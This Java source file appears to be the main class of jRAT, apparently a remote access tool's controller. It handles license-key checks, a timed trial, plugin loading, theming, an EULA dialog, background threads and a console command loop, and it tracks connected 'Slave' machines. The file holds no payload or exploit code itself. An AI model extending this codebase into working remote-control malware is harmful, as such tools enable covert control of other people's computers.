package io.jrat.client;

import io.jrat.client.commands.DefaultCommands;
import io.jrat.client.extensions.Plugin;
import io.jrat.client.extensions.PluginLoader;
import io.jrat.client.io.Files;
import io.jrat.client.settings.AbstractSettings;
import io.jrat.client.settings.Settings;
import io.jrat.client.settings.Statistics;
import io.jrat.client.settings.Theme;
import io.jrat.client.threads.ThreadCheckVersion;
import io.jrat.client.threads.ThreadPing;
import io.jrat.client.ui.dialogs.DialogEula;
import io.jrat.client.ui.frames.Frame;
import io.jrat.client.utils.TrayIconUtils;
import io.jrat.common.Logger;
import io.jrat.common.OperatingSystem;
import io.jrat.common.Version;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

import javax.swing.JFileChooser;
import javax.swing.JOptionPane;
import javax.swing.UIManager;

import jrat.api.commands.Commands;
import jrat.api.events.OnDisableEvent;

public class Main {

	public static boolean trial = true;
	public static boolean debug;

	public static final List<Slave> connections = new ArrayList<Slave>();
	public static Frame instance;

	public static void main(String[] args) throws Exception {
		if (argsContains(args, "-genkey")) {
			Logger.log("Generating key");
			File file = new File("jrat.key");
			FileOutputStream out = new FileOutputStream(file);
			out.write(UniqueId.generateBinary());
			out.close();
			Logger.log("Wrote key to jrat.key");
			System.exit(0);
		}

		debug = argsContains(args, "-debug");

		if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
			System.setProperty("apple.laf.useScreenMenuBar", "true");
		}

		try {
			Theme.getGlobal().load();
			UIManager.setLookAndFeel(Theme.getGlobal().getTheme());
		} catch (Exception ex) {
			Main.debug("Could not use look and feel, setting default");
			ex.printStackTrace();
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		}
		
		try {
			boolean validated = UniqueId.validate(argsContains(args, "-showhexkey"));

			if (validated) {
				trial = false;
			}
		} catch (Exception ex) {
			ex.printStackTrace();
			
			new Thread(new Runnable() {
				@Override
				public void run() {
					try {
						Thread.sleep(1000L * 60L); // 1 min
					} catch (Exception e) {
						e.printStackTrace();
					}
					System.exit(0);
				}
			}).start();
			JOptionPane.showMessageDialog(null, "jRAT is limited, no license detected", "jRAT", JOptionPane.ERROR_MESSAGE);
		}

		if (isRunningFromHomeDir()) {
			JOptionPane.showMessageDialog(null, "Could not find /settings/ or /files/, please specify your " + Constants.NAME + " directory", Constants.NAME + "", JOptionPane.WARNING_MESSAGE);
			JFileChooser chooser = new JFileChooser();
			chooser.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);
			chooser.showOpenDialog(null);

			File file = chooser.getSelectedFile();

			if (file != null) {
				System.setProperty("user.dir", file.getAbsolutePath());
			}
		}

		System.setProperty("jrat.dir", System.getProperty("user.dir"));
		System.setProperty("jrat.version", Version.getVersion());

		try {
			PluginLoader.loadLibs();
			PluginLoader.loadPlugins();
		} catch (Exception e) {
			e.printStackTrace();
		}

		Statistics.getGlobal().load();

		instance = new Frame();

		AbstractSettings.loadAllGlobals();

		boolean showEULA = Settings.getGlobal().getBoolean("showeula");
		if (!showEULA) {
			DialogEula frame = new DialogEula(false);
			frame.setVisible(true);
		}

		if (!argsContains(args, "-noad") && trial) {
			//FrameAd frame = new FrameAd();
			//frame.setVisible(true);
			
			// TODO Ad
		}

		Files.getSettings().mkdirs();
		Files.getFiles().mkdirs();

		new ThreadCheckVersion().start();
		new ThreadPing().start();

		instance.setVisible(true);

		TrayIconUtils.initialize();
		Sound.initialize();

		Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
			public void run() {
				OnDisableEvent event = new OnDisableEvent();
				for (Plugin p : PluginLoader.plugins) {
					try {
						p.getMethods().get("ondisable").invoke(p.getInstance(), new Object[] { event });
					} catch (Exception ex) {
						ex.printStackTrace();
					}
				}

				AbstractSettings.saveAllGlobals();

				try {
					Theme.getGlobal().save();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}));

		DefaultCommands.addDefault();

		BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
		String s;

		while ((s = reader.readLine()) != null) {
			Commands.execute(s, System.out);
		}
	}

	public static boolean argsContains(String[] args, String s) {
		for (String str : args) {
			if (str.equalsIgnoreCase(s)) {
				return true;
			}
		}

		return false;
	}

	public static String getArg(String[] args, String arg) {
		for (int i = 0; i < args.length; i++) {
			if (args[i].equalsIgnoreCase(arg)) {
				return args[i + 1];
			}
		}

		return null;
	}

	public static String debug(Object s) {
		if (s == null) {
			s = "null";
		}
		Logger.log(s.toString());
		return s.toString();
	}

	public static String formatTitle() {
		String suffix = trial ? "Limited" : "";

		return Constants.NAME + " [" + connections.size() + "] " + Version.getVersion() + " " + suffix;
	}

	public static boolean isRunningFromHomeDir() {
		return !new File("settings/").exists() || !new File("files/").exists();
	}

}
